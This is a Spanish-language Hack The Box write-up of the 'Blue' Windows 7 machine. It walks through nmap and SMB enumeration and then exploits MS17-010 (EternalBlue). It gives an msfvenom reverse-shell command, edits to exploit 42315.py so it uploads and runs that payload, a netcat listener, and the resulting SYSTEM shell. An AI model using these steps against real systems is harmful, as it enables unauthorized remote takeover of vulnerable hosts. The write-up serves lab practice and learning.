---
layout: single
title: Blue - Hack The Box
excerpt: "Una máquina relativamente facil, ya que usamos un exploit muy conocido que hace juego con el nombre de la maquina y que hay una historia algo curiosa, siendo que este exploit supuestamente fue robado a la NCA."
date: 2023-01-18
classes: wide
header:
  teaser: /assets/images/htb-writeup-blue/blue_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Windows
  - SMB
  - Samba
  - SMB Remote Code Execution - MS17-010
  - Eternal Blue
  - Reverse Shell
  - OSCP Style
---
![](/assets/images/htb-writeup-blue/blue_logo.png)
Una máquina relativamente facil, ya que usamos un exploit muy conocido que hace juego con el nombre de la maquina y que hay una historia algo curiosa, siendo que este exploit "supuestamente" fue robado a la NCA.

# Recopilación de Información
## Traza ICMP
Como siempre, vamos a ver si la maquina esta conectada, lanzando un ping y a su vez, veremos que SO opera gracias al TTL.
```
ping -c 4 10.10.10.40 
PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=128 ms
64 bytes from 10.10.10.40: icmp_seq=2 ttl=127 time=130 ms
64 bytes from 10.10.10.40: icmp_seq=3 ttl=127 time=130 ms
64 bytes from 10.10.10.40: icmp_seq=4 ttl=127 time=131 ms

--- 10.10.10.40 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 128.426/129.686/130.894/0.884 ms
```
Vemos que la maquina tiene el sistema Windows, empecemos ahora con los escaneos.

## Escaneo de Puertos
Vamos a buscar que puertos estan abiertos en esta maquina:
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.40 -oG allPorts             

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 13:28 CST
Initiating SYN Stealth Scan at 13:28
Scanning 10.10.10.40 [65535 ports]
Discovered open port 139/tcp on 10.10.10.40
Discovered open port 445/tcp on 10.10.10.40
Discovered open port 135/tcp on 10.10.10.40
Discovered open port 49156/tcp on 10.10.10.40
Discovered open port 49154/tcp on 10.10.10.40
Discovered open port 49152/tcp on 10.10.10.40
Completed SYN Stealth Scan at 13:29, 48.37s elapsed (65535 total ports)
Nmap scan report for 10.10.10.40
Host is up, received user-set (0.59s latency).
Scanned at 2023-01-18 13:28:52 CST for 49s
Not shown: 41657 filtered tcp ports (no-response), 23872 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 48.61 seconds
           Raw packets sent: 227709 (10.019MB) | Rcvd: 24244 (969.820KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP SYN Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envio de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Vemos varios puertos abiertos, pero ya podemos deducir que la maquina usa el servicio SMB. Ahora vamos al escaneo de servicios.

## Escaneo de Servicios
Aplicando escaneo de servicios a los puertos abiertos:
```
nmap -sC -sV -p135,139,445,49152,49154,49156 10.10.10.40 -oN targeted              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 13:31 CST
Nmap scan report for 10.10.10.40
Host is up (0.13s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-18T19:32:34+00:00
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-18T19:32:33
|_  start_date: 2023-01-18T19:27:28
|_clock-skew: mean: 5s, deviation: 1s, median: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.54 seconds
```
* -sC: Para indicar un lanzamiento de scripts basicos de reconocimiento.
* -sV: Para identificar los servicios/version que estan activos en los puertos que se analicen.
* -p: Para indicar puertos especificos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Aqui vemos que se usa el servicio Samba(smb), es tiempo de buscar un exploit. Pero antes veamos un par de cositas que nos dice este escaneo.

Ojito con la siguiente información: servidor pero primero veamos si podemos listar los recursos compartidos:
```
Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: use
```
Nos indica que podemos logearnos en el servidor como invitados, asi que podriamos enumerar dicho servidor pero primero veamos si podemos listar los recursos compartidos:
```
smbclient -L 10.10.10.40                                       
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
Vemos la carpeta del Admin y usuarios, si bien podemos intentar entrar en usuarios, porque obviamente en Admin no podremos, vamos a buscar un exploit primero.

# Analisis de Vulnerabilidades
## Buscando un Exploit
Hagamos como siempre, usando la herramienta **searchsploit** para buscar un exploit adecuado de la maquina, como servicio usaremos: Windows 7 Professional 7601 Service Pack 1.
```
searchsploit Windows 7 Profesional 7601 service pack 1
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```
A canijote, no nos salio nada. Entonces vamos a buscar por internet a ver que nos aparece, solo añadamos exploit al final para que tengamos algun resultado favorable:

Y justo nos sale un gihub con un exploit: 
* https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit

Leyendolo un poco, este exploit necesita usar un entorno virtual en python 2, necesitamos tener instalada la libreria Impacket de python y crear una **Reverse Shell**, obviamente antes de continuar hay que clonar el github en nuestro equipo.

## Configurando Exploit
* Cambiando nombre de exploit(opcional):
```
mv 42315.py Eternal_Blue.py
```

* Instalando Entorno Virtual en Python 2:
```
apt-get install python3-virtualenv && virtualenv -p python2 venv && . venv/bin/activate
```
Nota: Sabras que el entorno virtual se activo porque al inicio del path veras la leyenda **(venv)**

* Instalando libreria Impacket en Entorno Virtual:
```
pip install impacket
```
* Creando Reverse Shell con Msfvenom:
```
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=ObviamentePonAquiTuIP LPORT=443 > eternal-blue.exe
```
* Modificando el exploit con algunos datos:
```
USERNAME = '' -> USERNAME = 'guest'
smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py') -> smb_send_file(smbConn, '/Path_Donde_Esta_El_Reverse_Shell/eternal-blue.exe' 'C', '/eternal-blue.exe')
service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt') -> service_exec(conn, r'cmd /c c:\eternal-blue.exe')
```
# Explotando Vulnerabilidades
Una vez ya listo el exploit y siguiendo en el entorno virtual, vamos a activar una netcat que es ahi donde se conectara el exploit y luego activamos el exploit:
```
nc -nvlp 443
listening on [any] 443 ...
```
* Activando exploit:
```
python Exploit_Blue.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: samr
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8004208300
SESSION: 0xfffff8a009403420
FLINK: 0xfffff8a008a75048
InParam: 0xfffff8a008a4815c
MID: 0x2007
unexpected alignment, diff: 0x2c048
leak failed... try again
CONNECTION: 0xfffffa8004208300
SESSION: 0xfffff8a009403420
FLINK: 0xfffff8a008aba088
InParam: 0xfffff8a008ab415c
MID: 0x2103
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Opening SVCManager on 10.10.10.40.....
Creating service TAQr.....
Starting service TAQr.....
The NETBIOS connection with the remote host timed out.
Removing service TAQr.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```
* Resultado en Netcat:
```
nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.40] 49173
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>whoami
whoami
nt authority\system
```
Y listo ya estamos dentro la maquina, ya solo buscamos las flags y yasta...pero...QUE FUE LO QUE HICIMOS????

Bueno vamos a investigarlo y vamos a investigar que es eso de Eternal Blue.

## Investigación
Bueno el Eternal Blue es una serie de vulnerabilidades del software de Microsoft como el exploit creado por la NSA como herramienta de ciberataque. Es denominado MS17-010, por lo que lo podemos buscar asi en internet o en searchsploit:

```
searchsploit MS17-010                   
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metaspl | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                              | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                           | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)       | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                 | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)              | windows_x86-64/remote/41987.py
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Incluso aqui aparece el exploit que usamos y descargamos desde el github que encontre, pero sigamos investigando.

**EternalBlue aprovecha las vulnerabilidades de SMBv1 para insertar paquetes de datos maliciosos y propagar el malware por la red.**

Si analizamos el exploit que se uso, vemos que se conecta a la maquina victima para poder cargar un payload, en nuestro caso la **Reverse Shell** y con eso poder conectarnos a la maquina, o bueno eso es lo que entiendo:
```
def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()

        print('creating file c:\\pwned.txt on the target')
        tid2 = smbConn.connectTree('C$')
        fid2 = smbConn.createFile(tid2, '/pwned.txt')
        smbConn.closeFile(tid2, fid2)
        smbConn.disconnectTree(tid2)

        smb_send_file(smb_send_file(smbConn, '/Path_Donde_Esta_El_Reverse_Shell/eternal-blue.exe','C','/eternal-blue.exe')
        service_exec(conn, r'cmd /c c:\\eternal-blue.exe')
        # Note: there are many methods to get shell over SMB admin session
        # a simple method to get shell (but easily to be detected by AV) is
        # executing binary generated by "msfvenom -f exe-service ..."
```
Aqui incluso nos ponen una nota sobre las muchas opciones que hay para convertirnos en admin y menciona el metodo simple que fue lo que hicimos. Pienso que la sección arriba del **smb_send_file** no sirve de mucho, si lo comentamos no pasaria nada, el exploit lo más seguro es que seguiria funcionando.

Hay un github que incluye muchas cosas más y claro con la explicación de cada una: https://github.com/worawit/MS17-010

Este basicamente es lo mismo que descargamos pero incluye más scripts utiles, por asi decirlo es más completo y algo util que tiene es un script en python llamado checker, que nos puede ayudar a detectar los **named pipes**, estos nos sirven para ver en cuales son potenciales para inyectar comandos. Esto es mejor explicado por el **streamer S4vitar** en el siguiente link: https://www.youtube.com/watch?v=92XycxcAXkI

## Notas
Si queremos usar las herramientas que estan en el github que usar S4vitar, es necesario instalar pip2 para usar python2, para esto hacemos lo siguiente:

* Actualizamos todo: apt update
* Necesitamos un archivo para poder usar el pip2, para obtenerlo usamos: curl https://bootstrap.pypa.io/pip/2.7/get-pip.py > get-pip.py
* Ahora actualizamos con pip install --upgrade setuptools
* E instalamos impacket -> pip2.7 install impacket

Y aqui una forma distinta para usar nmap:
```
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
"auth"
"broadcast"
"brute"
"default"
"discovery"
"dos"
"exploit"
"external"
"fuzzer"
"intrusive"
"malware"
"safe"
"version"
"vuln"
```
Estos son los scripts que se pueden usar en nmap para encontrar vulnerabilidades especificas, hacer fuerza bruta a la hora de escanear (que solo seria bueno en un entorno controlado), etc. Aqui un ejemplo:
```
nmap --script "vuln and safe" -p445 10.10.10.40 -oN smbVulnScan
Nmap 7.93 scan initiated Jan 19 12:42:40 2023 as: nmap --script "vuln and safe" -p445 -oN smbVulnScan 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up (0.14s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done at Jan 19 12:42:44 2023 -- 1 IP address (1 host up) scanned in 4.35 seconds
```

## Links de Investigación
* https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit
* https://www.avast.com/es-es/c-eternalblue
* https://www.exploit-db.com/exploits/42315
* https://github.com/worawit/MS17-010
* https://www.youtube.com/watch?v=92XycxcAXkI

# FIN
